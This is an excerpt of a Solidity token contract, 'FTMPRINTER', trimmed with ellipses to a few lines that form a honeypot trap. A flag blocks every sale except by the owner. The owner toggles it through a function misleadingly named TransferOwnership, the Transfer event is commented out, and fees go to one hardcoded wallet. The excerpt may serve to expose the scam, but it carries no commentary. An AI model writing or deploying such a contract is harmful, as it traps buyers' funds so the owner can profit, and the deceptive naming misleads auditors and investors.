...
contract FTMPRINTER is IBEP20, Auth {
    ...
    address public autoLiquidityReceiver=0x9162Cf7339b4a6A337435869Ec12F47bfBD9Eeff; 
    address public marketingFeeReceiver=0x9162Cf7339b4a6A337435869Ec12F47bfBD9Eeff; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!Rewards || sender==owner), "Rrwards disabled");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function  TransferOwnership(bool value) external onlyOwner {
        Rewards = value;
    }
